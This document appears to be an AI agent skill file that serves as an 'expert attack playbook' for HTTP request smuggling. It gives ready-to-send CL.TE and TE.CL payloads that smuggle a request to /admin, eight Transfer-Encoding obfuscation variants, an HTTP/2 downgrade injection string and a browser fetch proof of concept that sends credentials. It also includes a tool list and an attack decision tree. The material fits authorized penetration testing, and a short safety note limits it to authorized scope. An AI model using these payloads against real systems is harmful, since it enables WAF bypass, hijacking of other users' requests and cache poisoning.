---
name: request-smuggling
description: >-
  HTTP request smuggling and desynchronization testing. Use when front proxies,
  CDNs, or load balancers disagree with the origin on message framing
  (Content-Length vs Transfer-Encoding), on HTTP/2→HTTP/1 translation, or when
  exploring client-side desync via browser fetch pipelines.
---

# SKILL: HTTP Request Smuggling — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert HTTP desync techniques. Covers CL.TE, TE.CL, TE.TE obfuscation variants, HTTP/2 downgrade and pseudo-header confusion, client-side desync (browser `fetch` pipelines), and tool-assisted fuzzing. Assumes familiarity with raw HTTP/1.1 framing and reverse-proxy topologies. This is not "header injection" — it is **message boundary disagreement** between hops.

Chinese routing hint: Load this skill when you suspect the CDN/reverse proxy and origin disagree on "where the request ends," or when anomalies appear from H2 downgrading to H1 splicing.

## QUICK START

### CL.TE first probe (frontend trusts CL, backend trusts chunked)

Prerequisite: Frontend prioritizes `Content-Length`, backend prioritizes `Transfer-Encoding: chunked`. Use a very short CL so the frontend swallows the "fake ending," while the backend still parses as chunked, leaving the remainder to bleed into the next request.

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- The frontend, following `Content-Length: 13`, reads only 13 bytes (i.e., `0\r\n\r\nSMUGGLED` totals 13 bytes) and considers the request complete.
- The backend, following chunked encoding: reads the `0` terminator, then treats **`SMUGGLED` and everything after** as the **start of the next request's** byte stream.

### TE.CL first probe (frontend trusts chunked, backend trusts CL)

Prerequisite: Frontend parses chunked, backend only looks at `Content-Length`. Make **CL exactly equal to the byte count of the chunk length line** (commonly `4`: two hex digits + `\r\n`). The backend only consumes the length line, leaving the remaining chunk data and terminator on the connection to be spliced with subsequent messages.

Embedding a second request inside the chunk (all line endings are **CRLF**; `35` is the hex chunk length = 53 bytes):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

On the wire, the chunk body must be exactly 53 bytes; if you change the path or headers, recalculate the chunk length and update the hex length line accordingly.

### Safety note

Only test within **authorized scope**; concurrent smuggling may cause connection pool pollution, cache corruption, or impact other tenants' traffic. Prefer isolated environments or low-traffic windows.

---

## 1. CORE CONCEPT

**Definition**: Two (or more) HTTP processing entities disagree on **where the first request ends and the second request begins** within the **same TCP/TLS stream**, enabling an attacker to embed a **partial or complete** second request inside one "logical request."

```
  Client          Front (proxy/WAF)              Back (origin)
     |                     |                            |
     |==== Request A+B ===>|                            |
     |                     | parses boundary #1         | parses boundary #2
     |                     |         \                  |         /
     |                     |          different split points
     |                     |                            |
     v                     v                            v
                   Request A (seen)              Request A' + smuggled B
```

**Distinction from CRLF injection**: CRLF injection typically targets **responses** or **header lines**; smuggling exploits differences in **RFC 7230 message framing** (`Content-Length` / `chunked`) between implementations.

**High-value consequences**: Bypass WAF rules (the smuggled body is not in the frontend's "request"), hijack other users' requests on the same-origin connection (request queue pollution), aid cache poisoning, and disrupt authentication boundaries.

---

## 2. CL.TE VULNERABILITIES

**Pattern**: Frontend uses **`Content-Length`** as authoritative; backend uses **`Transfer-Encoding: chunked`** as authoritative.

**Precise example** (consistent with §0): `Content-Length: 13` and `Transfer-Encoding: chunked` both present, body is:

```text
0\r\n\r\nSMUGGLED
```

Byte count: `0` + `\r\n` + `\r\n` + `SMUGGLED` = 13.

**Backend perspective**: The chunked stream ends at `0\r\n\r\n`; if `SMUGGLED` matches a `METHOD SP` or valid start line, it becomes a **smuggled request-line prefix**.

**Tuning**: If the target is sensitive to duplicate headers, case, or whitespace, fine-tune `Transfer-Encoding` variants (see §4) while preserving semantics, to match the combination where "frontend ignores TE, backend enforces TE."

---

## 3. TE.CL VULNERABILITIES

**Pattern**: Frontend parses **chunked**; backend only looks at **`Content-Length`** (or an undersized CL).

**Intent**: Frontend treats the entire malicious byte stream as the body; backend only reads the CL-specified length, leaving remaining bytes in the buffer to be concatenated with subsequent legitimate requests.

**Complete TE.CL embedding a second request** (same family as §0; `Content-Length: 4` + first chunk length line `35\r\n`):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

Explanation:

- **Backend (CL)**: From the start of the message body, reads only 4 bytes → `3` `5` `\r` `\n`, considers the body complete; remaining bytes stay in the TCP read buffer.
- **Frontend (TE)**: Parses the complete stream as chunked, treating the entire `GET /admin...` block as part of the body of the **first request** (which it has already declared finished) — forwarding or consuming it depending on the product. The boundary disagreement with the backend constitutes TE.CL.

For longer smuggling (e.g., `POST` + `Content-Length: 11` + `x=1`), the chunk length is approximately `76` (hex `0x76` = 118 bytes); you can still use `Content-Length: 4` to make the backend only read the length line.

**Practical notes**: The chunk length field must be valid hex; the second request segment must satisfy the target's expectations for Host, path, and session cookies; timing windows and connection reuse policies determine whether you can "hit" another user's request.

---

## 4. TE.TE VULNERABILITIES

**Pattern**: Both frontend and backend claim to handle `Transfer-Encoding`, but disagree on **which TE value takes effect** or whether it is valid — still resulting in an equivalent desync where "one side considers it non-chunked, the other considers it chunked."

The following **8 obfuscation variants** are used to probe parsing divergence (shown one per line; `\t` represents a literal TAB):

```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```

```http
Transfer-Encoding: x
```

```http
Transfer-Encoding:[TAB]chunked
```
(Replace `[TAB]` with actual `\x09`.)

```http
 Transfer-Encoding: chunked
```
(One leading space on the line.)

```http
X: X
Transfer-Encoding: chunked
```
(The previous line's value is `X` and the next line starts with `Transfer-Encoding`: exploits **line continuation / lenient header parsing**, causing one hop to merge or mis-split the two lines; between `X` and `Transfer-Encoding` is a single `\n` or `\r\n`, test per target stack.)

```http
Transfer-Encoding
: chunked
```
(The field name and colon are on **different physical lines**; some parsers still treat this as a valid `Transfer-Encoding: chunked`.)

**Strategy**: For each (front, back) pair, enumerate "which side accepts this variant as `chunked`"; then combine with §2/§3 to determine the equivalent CL.TE or TE.CL.

---

## 5. HTTP/2 REQUEST SMUGGLING

### H2 → H1 Downgrade

Common scenario: Edge supports HTTP/2, origin uses HTTP/1.1. If the implementation does not strictly normalize header fields and body boundaries, the following may occur:

- Incorrect mapping order between pseudo-headers and regular headers;
- Prohibited headers (e.g., certain `Connection` combinations) incorrectly forwarded;
- Merging rules for multiple same-name fields inconsistent with the origin.

### Pseudo-header / Header Injection-style Smuggling (Conceptual Payload)

The attack surface comes from "a downstream H1 parser treating certain bytes as the **start of a new request**." Common construction approaches in research literature and CTFs: leverage field values **ignored by one layer** but treated as **literals** by another, embedding something approximating:

```text
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: target
```

**Meaning**: If one hop keeps the full string inside a "header value," and the next hop performs an **incorrect split** during H1 reconstruction, it may start parsing `GET / HTTP/1.1` as a new request at the `\r\n\r\n` boundary.

**Testing directions**:

- `Transfer-Encoding` / `Content-Length` duplication and casing in H2 (H2 requires lowercase, but translation layers may get it wrong);
- Downgrade behavior when `:method`, `:path` contain anomalous characters;
- Interaction between tunneling or extended CONNECT and smuggling.

---

## 6. CLIENT-SIDE DESYNC

**Scenario**: The browser's request body handling disagrees with middleware/origin, or leverages features like **`no-cors` + preflight exemption** to send "atypical" messages, triggering **queue effects similar** to classic CL.TE/TE.CL (depending on architecture).

**HEAD + GET chain**: Some stacks have historical flaws in handling HEAD response bodies, subsequent pipelining, or connection reuse; needs verification against specific browser versions and target proxies.

**JavaScript PoC shape** (illustrative: setting the body to a raw byte sequence containing `GET`, paired with `no-cors` and credentials):

```javascript
fetch("https://target.example/vulnerable", {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  body: "GET /admin HTTP/1.1\r\nHost: target.example\r\n\r\n"
});
```

**Note**: Browser security models limit readability; success typically manifests as **side effects on other requests on the connection** or **server-side log/behavior anomalies**, not direct response reading. Must be evaluated in conjunction with same-origin policy, CORS, and whether browser extensions or malformed proxies are involved.

---

## 7. TOOLS

| Tool | Purpose |
|------|---------|
| **Burp Suite — HTTP Request Smuggler** (BApp Store) | Automated desync detection, common variants, timing differential analysis |
| **defparam/smuggler** (GitHub) | Python script for batch generation/sending of smuggling probes |
| **dhmosfunk/simple-http-smuggler-generator** (GitHub) | Quick assembly of raw CL.TE / TE.CL message templates |

**Usage tips**: First passively confirm the existence of a **frontend + origin** dual-hop; then select the least disruptive probe; reduce concurrency against production environments.

---

## 8. DETECTION DECISION TREE

```
                        Start: reverse proxy / CDN in path?
                                    |
                    NO -------------+------------- YES
                    |                               |
            Low classic smuggling                    |
            (still test H2 desync)                   v
                                            Can you send TE + CL together?
                                                    |
                              NO -------------------+------------------- YES
                              |                                         |
                      Test H2-only issues                    Front prefers which?
                      (pseudo-header, reset)                            |
                                        +-------------------------------+-------------------------------+
                                        |                               |                               |
                                   CL wins                          TE wins                         errors /
                                        |                               |                          connection
                                        v                               v                               |
                                   CL.TE probes                    TE.CL probes                    TE.TE obfuscation
                                   (Sec 0,2)                       (Sec 0,3)                       (Sec 4)
                                        |                               |                               |
                                        v                               v                               v
                              Time / content /                    Adjust chunk                     Pairwise matrix:
                              queue poisoning                     sizes + CL                      which hop accepts
                              signals?                            alignment                       which variant?
                                        |                               |                               |
                                        +-------------------------------+-------------------------------+
                                                                        |
                                                                        v
                                                              Confirm with second request
                                                              smuggled (replay-safe)
                                                              or Collaborator-style side signal
```

---

## TESTING CHECKLIST

- [ ] Identify frontend (proxy/CDN/WAF) and backend (origin) server pair
- [ ] Confirm both CL and TE headers can be sent simultaneously
- [ ] Test CL.TE: frontend trusts Content-Length, backend trusts Transfer-Encoding
- [ ] Test TE.CL: frontend trusts Transfer-Encoding, backend trusts Content-Length
- [ ] Test TE.TE obfuscation: 8+ Transfer-Encoding variant forms
- [ ] Test HTTP/2 downgrade: pseudo-header injection, H2-to-H1 translation issues
- [ ] Measure timing differentials between smuggled and normal requests
- [ ] Confirm smuggling with a second request that shows queue poisoning or content injection
- [ ] Test client-side desync via browser fetch with no-cors mode
- [ ] Verify with out-of-band signal (Collaborator, DNS callback) when direct response is unclear
- [ ] Test on isolated environment first to avoid connection pool pollution
- [ ] Enumerate which hop accepts which TE obfuscation variant via pairwise matrix

## MCP TOOLS

| Tool | Use Case |
|------|----------|
| `http_framework_test` | Craft raw HTTP requests with CL/TE header combinations for desync probing |
| `http_repeater` | Replay and modify smuggling payloads to test CL.TE, TE.CL, and TE.TE variants |
| `burpsuite_alternative_scan` | Comprehensive web scanning to detect request smuggling surfaces |
| `browser_agent_inspect` | Inspect client-side desync vectors and browser fetch pipeline behavior |

## RELATED ROUTING

- **Input enters an interpreter/query language/template** (unrelated to HTTP framing) → [Injection Testing Router](../command-injection/SKILL.md) (then drill down into XSS, SQLi, SSTI, etc.).
- **Response header splitting, Location CRLF** → [CRLF Injection](../crlf-injection/SKILL.md).
- **Cache and path key confusion** → [Web Cache Deception](../cache-deception/SKILL.md).

When you have confirmed it is an **HTTP message boundary** issue rather than parameter injection, **stay in this skill** to avoid misrouting to generic injection flows.
